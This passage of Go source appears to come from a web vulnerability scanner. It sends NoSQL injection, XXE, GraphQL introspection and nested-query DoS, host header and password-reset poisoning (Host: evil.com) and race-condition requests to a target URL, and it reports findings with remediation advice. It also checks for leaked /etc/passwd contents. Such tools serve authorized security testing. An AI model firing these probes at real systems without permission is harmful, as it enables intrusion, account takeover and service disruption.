					Remediation: "Disable $where queries. Use parameterized queries only.",
				}
			}
		}
	}

	// Test JSON body if provided
	if opts.Data != "" && opts.IsJSON {
		for _, payload := range payloads {
			if !strings.HasPrefix(payload, "{") {
				continue
			}

			// Try to inject payload into JSON values
			modifiedData := injectNoSQLPayload(opts.Data, payload)
			if modifiedData == "" {
				continue
			}

			req, err := http.NewRequest("POST", opts.URL, strings.NewReader(modifiedData))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", "application/json")

			if opts.UserAgent != "" {
				req.Header.Set("User-Agent", opts.UserAgent)
			}

			start := time.Now()
			resp, err := client.Do(req)
			elapsed := time.Since(start)
			if err != nil {
				continue
			}

			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			// Check for authentication bypass indicators
			bypassIndicators := []string{
				"logged in",
				"welcome",
				"dashboard",
				"success",
				"authenticated",
				"admin",
				"token",
			}

			for _, indicator := range bypassIndicators {
				if strings.Contains(strings.ToLower(string(body)), indicator) {
					resultChan <- VulnResult{
						Type:        VulnNoSQLi,
						Severity:    SeverityCritical,
						URL:         opts.URL,
						Parameter:   "JSON body",
						Payload:     payload,
						Evidence:    fmt.Sprintf("Possible auth bypass, found: %s", indicator),
						Description: "NoSQL Injection may allow authentication bypass using operator injection.",
						Remediation: "Sanitize JSON input. Reject objects with $ operators in user input.",
					}
					break
				}
			}

			// Time-based check
			if strings.Contains(payload, "sleep") && elapsed > 4*time.Second {
				resultChan <- VulnResult{
					Type:        VulnNoSQLi,
					Severity:    SeverityCritical,
					URL:         opts.URL,
					Parameter:   "JSON body",
					Payload:     payload,
					Evidence:    fmt.Sprintf("Time-based injection: %v delay", elapsed),
					Description: "Time-based NoSQL Injection via JSON body.",
					Remediation: "Disable $where. Validate all JSON input strictly.",
				}
			}
		}
	}
}

// XXEOptions holds XXE testing configuration
type XXEOptions struct {
	ScanOptions
	OOBCallback string
	PayloadType string // file, oob, error
}

// TestXXE tests for XML External Entity vulnerabilities
func TestXXE(opts XXEOptions, resultChan chan<- VulnResult) {
	client := createClient(opts.ScanOptions)

	for _, payload := range XXEPayloads {
		// Replace callback placeholder if provided
		testPayload := payload
		if opts.OOBCallback != "" {
			testPayload = strings.ReplaceAll(payload, "CALLBACK", opts.OOBCallback)
		} else {
			// Skip OOB payloads if no callback provided
			if strings.Contains(payload, "CALLBACK") {
				continue
			}
		}

		// Filter by payload type if specified
		if opts.PayloadType != "" {
			switch opts.PayloadType {
			case "file":
				if !strings.Contains(payload, "file://") {
					continue
				}
			case "oob":
				if !strings.Contains(payload, "http://") {
					continue
				}
			case "error":
				if !strings.Contains(payload, "nonexistent") {
					continue
				}
			}
		}

		req, err := http.NewRequest("POST", opts.URL, strings.NewReader(testPayload))
		if err != nil {
			continue
		}

		req.Header.Set("Content-Type", "application/xml")
		if opts.UserAgent != "" {
			req.Header.Set("User-Agent", opts.UserAgent)
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		// Check for file disclosure indicators
		xxeIndicators := []struct {
			pattern  string
			severity Severity
			desc     string
		}{
			{"root:x:0:0:", SeverityCritical, "XXE file disclosure: /etc/passwd contents leaked"},
			{"[extensions]", SeverityCritical, "XXE file disclosure: Windows win.ini contents leaked"},
			{"[boot loader]", SeverityCritical, "XXE file disclosure: Windows boot.ini contents leaked"},
			{"<?php", SeverityCritical, "XXE file disclosure: PHP source code leaked"},
			{"PD9waHA", SeverityHigh, "XXE with PHP filter: base64-encoded PHP source"},
			{"uid=", SeverityCritical, "XXE command execution via expect://"},
		}

		for _, indicator := range xxeIndicators {
			if strings.Contains(bodyStr, indicator.pattern) {
				resultChan <- VulnResult{
					Type:        VulnXXE,
					Severity:    indicator.severity,
					URL:         opts.URL,
					Parameter:   "XML body",
					Payload:     truncate(testPayload, 100),
					Evidence:    fmt.Sprintf("Pattern found: %s", indicator.pattern),
					Description: indicator.desc,
					Remediation: "Disable external entity processing. Use defused XML parsers. Set DTD processing to prohibited.",
				}
				break
			}
		}

		// Check for error-based XXE indicators
		errorIndicators := []string{
			"SYSTEM",
			"ENTITY",
			"DOCTYPE",
			"failed to load external entity",
			"External entity",
			"parser error",
			"xmlParseEntityRef",
			"Start tag expected",
		}

		for _, errInd := range errorIndicators {
			if strings.Contains(bodyStr, errInd) {
				resultChan <- VulnResult{
					Type:        VulnXXE,
					Severity:    SeverityMedium,
					URL:         opts.URL,
					Parameter:   "XML body",
					Payload:     truncate(testPayload, 100),
					Evidence:    fmt.Sprintf("XML error: %s", errInd),
					Description: "XML parsing error exposed. The server processes XML and may be vulnerable to XXE.",
					Remediation: "Disable external entity processing. Configure XML parser securely.",
				}
				break
			}
		}
	}
}

// GraphQLOptions holds GraphQL testing configuration
type GraphQLOptions struct {
	ScanOptions
	Introspect bool
	DoS        bool
}

// GraphQLSchema represents introspection result
type GraphQLSchema struct {
	Types     []string
	Queries   []string
	Mutations []string
}

// TestGraphQL tests for GraphQL security issues
func TestGraphQL(opts GraphQLOptions, resultChan chan<- VulnResult) {
	client := createClient(opts.ScanOptions)

	// Test introspection
	introspectionQueries := []struct {
		name  string
		query string
	}{
		{"simple", GraphQLQueries["introspection_simple"]},
		{"full", GraphQLQueries["introspection_full"]},
		{"query_type", GraphQLQueries["query_type"]},
		{"mutation_type", GraphQLQueries["mutation_type"]},
	}

	for _, iq := range introspectionQueries {
		req, err := http.NewRequest("POST", opts.URL, strings.NewReader(iq.query))
		if err != nil {
			continue
		}

		req.Header.Set("Content-Type", "application/json")
		if opts.UserAgent != "" {
			req.Header.Set("User-Agent", opts.UserAgent)
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		// Check if introspection is enabled
		if strings.Contains(bodyStr, "__schema") || strings.Contains(bodyStr, "__type") {
			if strings.Contains(bodyStr, "queryType") || strings.Contains(bodyStr, "fields") {
				severity := SeverityMedium
				if strings.Contains(bodyStr, "mutation") || strings.Contains(bodyStr, "Mutation") {
					severity = SeverityHigh
				}

				resultChan <- VulnResult{
					Type:        VulnGraphQL,
					Severity:    severity,
					URL:         opts.URL,
					Parameter:   "Introspection",
					Payload:     iq.name,
					Evidence:    "Introspection query successful - schema exposed",
					Description: "GraphQL introspection is enabled. Attackers can enumerate the entire API schema.",
					Remediation: "Disable introspection in production. Use allowlists for permitted queries.",
				}
				break
			}
		}

		// Check for sensitive type names in schema
		sensitiveTypes := []string{
			"password", "secret", "token", "key", "admin",
			"credential", "private", "internal", "debug",
		}

		bodyLower := strings.ToLower(bodyStr)
		for _, sensitive := range sensitiveTypes {
			if strings.Contains(bodyLower, sensitive) {
				resultChan <- VulnResult{
					Type:        VulnGraphQL,
					Severity:    SeverityMedium,
					URL:         opts.URL,
					Parameter:   "Schema",
					Payload:     iq.name,
					Evidence:    fmt.Sprintf("Sensitive field found: %s", sensitive),
					Description: "GraphQL schema exposes potentially sensitive field names.",
					Remediation: "Review schema for sensitive data exposure. Implement proper authorization.",
				}
			}
		}
	}

	// Test field suggestions (typo-based enumeration)
	suggestionQuery := `{"query":"{user{__badfield}}"}`
	req, _ := http.NewRequest("POST", opts.URL, strings.NewReader(suggestionQuery))
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err == nil {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if strings.Contains(string(body), "Did you mean") || strings.Contains(string(body), "suggestions") {
			resultChan <- VulnResult{
				Type:        VulnGraphQL,
				Severity:    SeverityLow,
				URL:         opts.URL,
				Parameter:   "Field Suggestions",
				Payload:     suggestionQuery,
				Evidence:    "Server provides field suggestions on typos",
				Description: "GraphQL server suggests field names. This aids enumeration even without introspection.",
				Remediation: "Disable field suggestions in production GraphQL configuration.",
			}
		}
	}

	// Test for batching/DoS if enabled
	if opts.DoS {
		// Test query batching
		batchQuery := `[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]`
		req, _ := http.NewRequest("POST", opts.URL, strings.NewReader(batchQuery))
		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err == nil {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			if strings.Contains(string(body), "[") && strings.Count(string(body), "__typename") >= 2 {
				resultChan <- VulnResult{
					Type:        VulnGraphQL,
					Severity:    SeverityMedium,
					URL:         opts.URL,
					Parameter:   "Batching",
					Payload:     "Array batch query",
					Evidence:    "Multiple responses returned for batched queries",
					Description: "GraphQL batching is enabled. This may allow DoS via query multiplication.",
					Remediation: "Limit batch size. Implement query cost analysis and rate limiting.",
				}
			}
		}

		// Test deeply nested query (if introspection showed types)
		nestedQuery := `{"query":"{__schema{types{name fields{name type{name fields{name type{name}}}}}}}"}`
		req, _ = http.NewRequest("POST", opts.URL, strings.NewReader(nestedQuery))
		req.Header.Set("Content-Type", "application/json")

		start := time.Now()
		resp, err = client.Do(req)
		elapsed := time.Since(start)

		if err == nil {
			resp.Body.Close()
			if elapsed > 3*time.Second {
				resultChan <- VulnResult{
					Type:        VulnGraphQL,
					Severity:    SeverityHigh,
					URL:         opts.URL,
					Parameter:   "Query Depth",
					Payload:     "Nested introspection",
					Evidence:    fmt.Sprintf("Slow response: %v for nested query", elapsed),
					Description: "GraphQL server is vulnerable to DoS via deeply nested queries.",
					Remediation: "Implement query depth limiting. Set maximum query complexity.",
				}
			}
		}
	}
}

// HostHeaderOptions holds host header testing configuration
type HostHeaderOptions struct {
	ScanOptions
	Poison bool // password reset poisoning
	Cache  bool // web cache poisoning
}

// TestHostHeader tests for host header injection vulnerabilities
func TestHostHeader(opts HostHeaderOptions, resultChan chan<- VulnResult) {
	client := createClient(opts.ScanOptions)

	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}
	originalHost := parsedURL.Host

	for _, payload := range HostHeaderPayloads {
		req, err := http.NewRequest("GET", opts.URL, nil)
		if err != nil {
			continue
		}

		// Set the malicious header
		if payload.Header == "Host" {
			req.Host = payload.Value
		} else {
			req.Header.Set(payload.Header, payload.Value)
		}

		if opts.UserAgent != "" {
			req.Header.Set("User-Agent", opts.UserAgent)
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		// Check if the payload is reflected in the response
		if strings.Contains(bodyStr, payload.Value) || strings.Contains(bodyStr, "evil.com") {
			severity := SeverityMedium
			if strings.Contains(strings.ToLower(bodyStr), "password") ||
				strings.Contains(strings.ToLower(bodyStr), "reset") {
				severity = SeverityHigh
			}

			resultChan <- VulnResult{
				Type:        VulnHostHeader,
				Severity:    severity,
				URL:         opts.URL,
				Parameter:   payload.Header,
				Payload:     payload.Value,
				Evidence:    fmt.Sprintf("Host header value reflected in response (%s)", payload.Desc),
				Description: "Host header injection detected. The server uses the Host header value in the response.",
				Remediation: "Validate Host header against allowlist. Use server-side URL generation.",
			}
		}

		// Check Location header for redirects
		location := resp.Header.Get("Location")
		if location != "" {
			if strings.Contains(location, payload.Value) || strings.Contains(location, "evil.com") {
				resultChan <- VulnResult{
					Type:        VulnHostHeader,
					Severity:    SeverityHigh,
					URL:         opts.URL,
					Parameter:   payload.Header,
					Payload:     payload.Value,
					Evidence:    fmt.Sprintf("Host reflected in redirect: %s", location),
					Description: "Host header controls redirect destination. This can be exploited for phishing or cache poisoning.",
					Remediation: "Generate redirect URLs server-side. Do not use Host header in redirects.",
				}
			}
		}

		// Check for cache poisoning indicators if --cache
		if opts.Cache {
			cacheHeaders := []string{
				resp.Header.Get("X-Cache"),
				resp.Header.Get("CF-Cache-Status"),
				resp.Header.Get("Age"),
				resp.Header.Get("X-Cache-Hits"),
			}

			for _, ch := range cacheHeaders {
				if ch != "" && (strings.Contains(strings.ToLower(ch), "hit") || ch != "0") {
					if strings.Contains(bodyStr, payload.Value) {
						resultChan <- VulnResult{
							Type:        VulnHostHeader,
							Severity:    SeverityCritical,
							URL:         opts.URL,
							Parameter:   "Cache Poisoning",
							Payload:     fmt.Sprintf("%s: %s", payload.Header, payload.Value),
							Evidence:    fmt.Sprintf("Cached response with injected content (Cache: %s)", ch),
							Description: "Web cache poisoning via Host header. Malicious content may be served to other users.",
							Remediation: "Configure cache to key on Host header. Validate Host strictly before caching.",
						}
					}
					break
				}
			}
		}
	}

	// Test password reset poisoning if --poison
	if opts.Poison {
		// Look for password reset endpoint
		resetEndpoints := []string{
			"/reset-password",
			"/forgot-password",
			"/password/reset",
			"/account/recover",
			"/auth/forgot",
		}

		for _, endpoint := range resetEndpoints {
			resetURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, originalHost, endpoint)

			req, err := http.NewRequest("POST", resetURL, strings.NewReader("email=test@example.com"))
			if err != nil {
				continue
			}

			req.Host = "evil.com"
			req.Header.Set("X-Forwarded-Host", "evil.com")
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			// Check if response indicates a reset was triggered
			if resp.StatusCode == 200 || resp.StatusCode == 302 {
				if strings.Contains(strings.ToLower(string(body)), "email") ||
					strings.Contains(strings.ToLower(string(body)), "sent") ||
					strings.Contains(strings.ToLower(string(body)), "reset") {
					resultChan <- VulnResult{
						Type:        VulnHostHeader,
						Severity:    SeverityHigh,
						URL:         resetURL,
						Parameter:   "Password Reset Poisoning",
						Payload:     "Host: evil.com",
						Evidence:    "Password reset endpoint accepts modified Host header",
						Description: "Password reset poisoning possible. Reset links may contain attacker-controlled domain.",
						Remediation: "Use fixed domain for password reset URLs. Never use Host header for email links.",
					}
				}
			}
		}
	}
}

// RaceOptions holds race condition testing configuration
type RaceOptions struct {
	ScanOptions
	Data       string
	Requests   int
	Concurrent bool
}

// RaceResult holds race condition test results
type RaceResult struct {
	VulnResult
	Responses    []int // status codes
	Inconsistent bool
	SuccessCount int
}

// TestRaceCondition tests for race condition vulnerabilities
func TestRaceCondition(opts RaceOptions, resultChan chan<- VulnResult) {
	if opts.Requests <= 0 {
		opts.Requests = 10
	}

	client := createClient(opts.ScanOptions)
	client.Timeout = time.Duration(opts.Timeout) * time.Second

	method := opts.Method
	if method == "" {
		method = "POST"
	}

	// Prepare all requests upfront
	var requests []*http.Request
	for i := 0; i < opts.Requests; i++ {
		var body io.Reader
		if opts.Data != "" {
			body = strings.NewReader(opts.Data)
		}

		req, err := http.NewRequest(method, opts.URL, body)
		if err != nil {
			continue
		}

		if opts.UserAgent != "" {
			req.Header.Set("User-Agent", opts.UserAgent)
		} else {
			req.Header.Set("User-Agent", "RaxuisCLI-RaceTest/1.0")
		}

		if opts.Cookie != "" {
			req.Header.Set("Cookie", opts.Cookie)
		}

		for key, value := range opts.Headers {
			req.Header.Set(key, value)
		}

		if opts.Data != "" {
			if strings.HasPrefix(opts.Data, "{") {
				req.Header.Set("Content-Type", "application/json")
			} else {
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			}
		}

		requests = append(requests, req)
	}

	// Results collection
	type response struct {
		StatusCode int
		Body       string
		Duration   time.Duration
		Error      error
	}

	responses := make([]response, len(requests))
	var wg sync.WaitGroup

	// Fire all requests simultaneously
	startBarrier := make(chan struct{})

	for i, req := range requests {
		wg.Add(1)
		go func(idx int, r *http.Request) {
			defer wg.Done()

			// Wait for start signal
			<-startBarrier

			start := time.Now()

			// Clone request body for each attempt
			var body io.Reader
			if opts.Data != "" {
				body = strings.NewReader(opts.Data)
			}
			newReq, _ := http.NewRequest(r.Method, r.URL.String(), body)
			newReq.Header = r.Header.Clone()

			resp, err := client.Do(newReq)
			elapsed := time.Since(start)

			if err != nil {
				responses[idx] = response{Error: err, Duration: elapsed}
				return
			}

			bodyBytes, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			responses[idx] = response{
				StatusCode: resp.StatusCode,
				Body:       string(bodyBytes),
				Duration:   elapsed,
			}
		}(i, req)
	}

	// Release all goroutines at once
	close(startBarrier)
	wg.Wait()

	// Analyze results
	statusCodes := make(map[int]int)
	successCount := 0
	var bodies []string
	var durations []time.Duration

	for _, resp := range responses {
		if resp.Error != nil {
			continue
		}
		statusCodes[resp.StatusCode]++
		durations = append(durations, resp.Duration)

		// Count successful operations
		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			successCount++
			bodies = append(bodies, resp.Body)
		}
	}

	// Check for race condition indicators
	// 1. Multiple successes when only one should occur
	if successCount > 1 {
		resultChan <- VulnResult{
			Type:        VulnRace,
			Severity:    SeverityHigh,
			URL:         opts.URL,
			Parameter:   fmt.Sprintf("%d concurrent requests", opts.Requests),
			Payload:     opts.Data,
			Evidence:    fmt.Sprintf("%d/%d requests succeeded (expected 1)", successCount, opts.Requests),
			Description: "Race condition detected. Multiple concurrent requests succeeded when only one should.",
			Remediation: "Implement proper locking/mutex. Use database transactions with row-level locking.",
		}
	}

	// 2. Different responses to identical requests
	uniqueResponses := make(map[string]int)
	for _, body := range bodies {
		// Normalize response (remove timestamps, etc.)
		normalized := normalizeResponse(body)
		uniqueResponses[normalized]++
	}

	if len(uniqueResponses) > 1 && len(bodies) > 2 {
		resultChan <- VulnResult{
			Type:        VulnRace,
			Severity:    SeverityMedium,
			URL:         opts.URL,
			Parameter:   "Response Inconsistency",
			Payload:     opts.Data,
			Evidence:    fmt.Sprintf("%d unique responses from %d requests", len(uniqueResponses), len(bodies)),
			Description: "Inconsistent responses detected. The application may have TOCTOU vulnerabilities.",
			Remediation: "Ensure atomic operations. Review state management for race conditions.",
		}
	}

	// 3. Timing analysis - large variance may indicate race
	if len(durations) > 2 {
		var totalDuration time.Duration
		minDuration := durations[0]
		maxDuration := durations[0]

		for _, d := range durations {
			totalDuration += d
			if d < minDuration {
				minDuration = d
			}
			if d > maxDuration {
				maxDuration = d
			}
		}

		avgDuration := totalDuration / time.Duration(len(durations))
		variance := maxDuration - minDuration

		// High variance with some very fast responses may indicate bypassed checks
		if variance > 2*avgDuration && minDuration < avgDuration/2 {
			resultChan <- VulnResult{
				Type:        VulnRace,
				Severity:    SeverityLow,
				URL:         opts.URL,
				Parameter:   "Timing Analysis",
				Payload:     opts.Data,
				Evidence:    fmt.Sprintf("High timing variance: min=%v, max=%v, avg=%v", minDuration, maxDuration, avgDuration),
				Description: "High response time variance detected. Some requests may have bypassed validation.",
				Remediation: "Review server-side validation timing. Implement consistent processing.",
			}
		}
	}

	// Summary
	if len(statusCodes) > 0 {
		statusSummary := ""
		for code, count := range statusCodes {
			statusSummary += fmt.Sprintf("%d(%dx) ", code, count)
		}
		resultChan <- VulnResult{
			Type:        VulnRace,
			Severity:    SeverityInfo,
			URL:         opts.URL,
			Parameter:   "Summary",
			Evidence:    fmt.Sprintf("Status codes: %s", statusSummary),
			Description: "Race condition test completed.",
			Remediation: "Review results for anomalies.",
		}
	}
}

// Helper function to normalize response for comparison
func normalizeResponse(body string) string {
	// Remove common dynamic elements
	patterns := []string{
		`"timestamp":\s*"[^"]*"`,
		`"time":\s*\d+`,
		`"date":\s*"[^"]*"`,
		`"id":\s*"[^"]*"`,
		`"request_id":\s*"[^"]*"`,
	}

	result := body
	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		result = re.ReplaceAllString(result, "")
	}
	return result
}

// Helper to inject NoSQL payload into JSON
func injectNoSQLPayload(jsonData, payload string) string {
	// Simple injection: replace string values with payload
	// This is a basic implementation - could be enhanced
	if strings.Contains(jsonData, `":"`) {
		// Replace first string value
		re := regexp.MustCompile(`":\s*"[^"]*"`)
		return re.ReplaceAllStringFunc(jsonData, func(match string) string {
			// Only replace first occurrence
			return `": ` + payload
		})
	}
	return ""
}

// ScanSecurityHeaders analyzes security headers
func ScanSecurityHeaders(opts ScanOptions) []VulnResult {
	var results []VulnResult

	client := createClient(opts)
	resp, _, err := doRequest(client, opts.URL, opts)
	if err != nil {
		return results
	}
	defer resp.Body.Close()

	headers := resp.Header

	// Check for missing security headers
	securityHeaders := map[string]struct {
		severity    Severity
		description string
		remediation string
	}{
		"Strict-Transport-Security": {
			SeverityMedium,
			"Missing HSTS header. The application may be vulnerable to SSL stripping attacks.",
			"Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' header.",
		},
		"Content-Security-Policy": {
			SeverityMedium,
			"Missing CSP header. The application may be vulnerable to XSS attacks.",
			"Implement a Content-Security-Policy header to restrict resource loading.",
		},
		"X-Content-Type-Options": {
			SeverityLow,
			"Missing X-Content-Type-Options header. The browser may MIME-sniff responses.",
			"Add 'X-Content-Type-Options: nosniff' header.",
		},
		"X-Frame-Options": {
			SeverityMedium,
			"Missing X-Frame-Options header. The application may be vulnerable to clickjacking.",
			"Add 'X-Frame-Options: DENY' or 'SAMEORIGIN' header.",
		},
		"X-XSS-Protection": {
			SeverityLow,
			"Missing X-XSS-Protection header. Browser XSS filter may not be enabled.",
			"Add 'X-XSS-Protection: 1; mode=block' header (note: deprecated in favor of CSP).",
		},
		"Referrer-Policy": {
			SeverityLow,
			"Missing Referrer-Policy header. Sensitive information may leak in referrer.",
			"Add 'Referrer-Policy: strict-origin-when-cross-origin' header.",
		},
		"Permissions-Policy": {
			SeverityLow,
			"Missing Permissions-Policy header. Browser features are not restricted.",
			"Add Permissions-Policy header to control browser features.",
		},
	}

	for header, info := range securityHeaders {
		if headers.Get(header) == "" {
			results = append(results, VulnResult{
				Type:        VulnHeaders,
				Severity:    info.severity,
				URL:         opts.URL,
				Parameter:   header,
				Evidence:    "Header not present",
				Description: info.description,
				Remediation: info.remediation,
			})
		}
	}

	// Check for dangerous headers
	if server := headers.Get("Server"); server != "" {
		if strings.Contains(server, "/") {
			results = append(results, VulnResult{
				Type:        VulnHeaders,
				Severity:    SeverityInfo,
				URL:         opts.URL,
				Parameter:   "Server",
				Evidence:    server,
				Description: "Server version disclosed. This may help attackers identify vulnerabilities.",
				Remediation: "Remove or obfuscate the Server header version information.",
			})
		}
	}

	if powered := headers.Get("X-Powered-By"); powered != "" {
		results = append(results, VulnResult{
			Type:        VulnHeaders,
			Severity:    SeverityInfo,
			URL:         opts.URL,
			Parameter:   "X-Powered-By",
			Evidence:    powered,
			Description: "Technology stack disclosed via X-Powered-By header.",
			Remediation: "Remove the X-Powered-By header.",
		})
	}

	// Check for insecure cookie flags
	for _, cookie := range resp.Cookies() {
		issues := []string{}
		if !cookie.Secure {
			issues = append(issues, "missing Secure flag")
		}
		if !cookie.HttpOnly {
			issues = append(issues, "missing HttpOnly flag")
		}
		if cookie.SameSite == http.SameSiteDefaultMode || cookie.SameSite == http.SameSiteNoneMode {
			issues = append(issues, "weak SameSite policy")
		}

		if len(issues) > 0 {
			results = append(results, VulnResult{
				Type:        VulnHeaders,
				Severity:    SeverityMedium,
				URL:         opts.URL,
				Parameter:   fmt.Sprintf("Cookie: %s", cookie.Name),
				Evidence:    strings.Join(issues, ", "),
				Description: "Cookie security flags are not properly set.",
				Remediation: "Set Secure, HttpOnly, and SameSite=Strict flags on sensitive cookies.",
			})
		}
	}

	return results
}

// QuickScan performs a quick vulnerability scan
func QuickScan(opts ScanOptions, resultChan chan<- VulnResult, doneChan chan<- bool) {
	defer func() { doneChan <- true }()

	// Test security headers first
	headerResults := ScanSecurityHeaders(opts)
	for _, r := range headerResults {
		resultChan <- r
	}

	var wg sync.WaitGroup

	// Run all tests concurrently
	wg.Add(5)

	go func() {
		defer wg.Done()
		TestXSS(opts, resultChan)
	}()

	go func() {
		defer wg.Done()
		TestSQLi(opts, resultChan)
	}()

	go func() {
		defer wg.Done()
		TestLFI(opts, resultChan)
	}()

	go func() {
		defer wg.Done()
		TestCommandInjection(opts, resultChan)
	}()

	go func() {
		defer wg.Done()
		TestOpenRedirect(opts, resultChan)
	}()

	wg.Wait()
}

// Helper functions

func createClient(opts ScanOptions) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: opts.Insecure,
		},
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: opts.Threads,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Duration(opts.Timeout) * time.Second,
	}

	if !opts.FollowRedir {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}
	}

	return client
}

func doRequest(client *http.Client, targetURL string, opts ScanOptions) (*http.Response, string, error) {
	method := opts.Method
	if method == "" {
		method = "GET"
	}

	req, err := http.NewRequest(method, targetURL, nil)
	if err != nil {
		return nil, "", err
	}

	if opts.UserAgent != "" {
		req.Header.Set("User-Agent", opts.UserAgent)
	} else {
		req.Header.Set("User-Agent", "RaxuisCLI-VulnScanner/1.0")
	}

	if opts.Cookie != "" {
		req.Header.Set("Cookie", opts.Cookie)
	}

	for key, value := range opts.Headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, "", err
	}

	body, _ := io.ReadAll(resp.Body)
	return resp, string(body), nil
}

func buildTestURL(parsedURL *url.URL, param, payload string) string {
	query := parsedURL.Query()
	query.Set(param, payload)
	parsedURL.RawQuery = query.Encode()
	return parsedURL.String()
}

// DisplayResults displays vulnerability results
func DisplayResults(results []VulnResult) {
	if len(results) == 0 {
		fmt.Println("\n[NO VULNERABILITIES FOUND]")
		return
	}

	fmt.Println("\n[VULNERABILITY SCAN RESULTS]")
	fmt.Println(strings.Repeat("=", 80))

	// Group by severity
	bySeverity := map[Severity][]VulnResult{
		SeverityCritical: {},
		SeverityHigh:     {},
		SeverityMedium:   {},
		SeverityLow:      {},
		SeverityInfo:     {},
	}

	for _, r := range results {
		bySeverity[r.Severity] = append(bySeverity[r.Severity], r)
	}

	// Summary
	fmt.Printf("\nSummary:\n")
	fmt.Printf("  Critical: %d\n", len(bySeverity[SeverityCritical]))
	fmt.Printf("  High:     %d\n", len(bySeverity[SeverityHigh]))
	fmt.Printf("  Medium:   %d\n", len(bySeverity[SeverityMedium]))
	fmt.Printf("  Low:      %d\n", len(bySeverity[SeverityLow]))
	fmt.Printf("  Info:     %d\n", len(bySeverity[SeverityInfo]))

	// Display by severity
	for _, severity := range []Severity{SeverityCritical, SeverityHigh, SeverityMedium, SeverityLow, SeverityInfo} {
		vulns := bySeverity[severity]
		if len(vulns) == 0 {
			continue
		}

		fmt.Printf("\n[%s]\n", severity)
		fmt.Println(strings.Repeat("-", 40))

		for i, v := range vulns {
			fmt.Printf("\n%d. %s\n", i+1, v.Type)
			fmt.Printf("   URL: %s\n", truncate(v.URL, 70))
			if v.Parameter != "" {
				fmt.Printf("   Parameter: %s\n", v.Parameter)
			}
			if v.Payload != "" {
				fmt.Printf("   Payload: %s\n", truncate(v.Payload, 50))
			}
			fmt.Printf("   Evidence: %s\n", truncate(v.Evidence, 60))
			fmt.Printf("   Description: %s\n", v.Description)
			fmt.Printf("   Remediation: %s\n", v.Remediation)
		}
	}

	fmt.Println()
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

// GetPayloads returns payloads for a specific vulnerability type
func GetPayloads(vulnType VulnType, level int) []string {
	switch vulnType {
	case VulnXSS:
		if p, ok := XSSPayloads[level]; ok {
			return p
		}
		return XSSPayloads[2]
	case VulnSQLi:
		if p, ok := SQLiPayloads[level]; ok {
			return p
		}
		return SQLiPayloads[2]
	case VulnLFI:
		if p, ok := LFIPayloads[level]; ok {
			return p
		}
		return LFIPayloads[2]
	case VulnCmdInj:
		if p, ok := CmdInjPayloads[level]; ok {
			return p
		}
		return CmdInjPayloads[2]
	case VulnOpen:
		return OpenRedirectPayloads
	case VulnNoSQLi:
		if p, ok := NoSQLiPayloads[level]; ok {
			return p
		}
		return NoSQLiPayloads[2]
	case VulnXXE:
		return XXEPayloads
	default:
		return nil
	}
}
